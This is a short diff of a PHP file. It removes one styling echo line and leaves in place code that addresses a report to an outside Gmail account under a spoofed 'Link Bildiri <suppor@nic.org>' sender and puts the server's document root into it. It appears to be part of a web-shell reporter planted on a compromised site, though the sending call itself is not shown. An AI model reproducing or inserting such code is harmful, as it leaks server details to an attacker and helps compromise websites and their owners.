@@ -1,5 +1,4 @@
 <?php
-echo '<span style="color:#0000FF;">';
 $who="webguvenligi19@gmail.com";
 $title="Link Bildiri <suppor@nic.org>\n";
 $send.="Directory : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
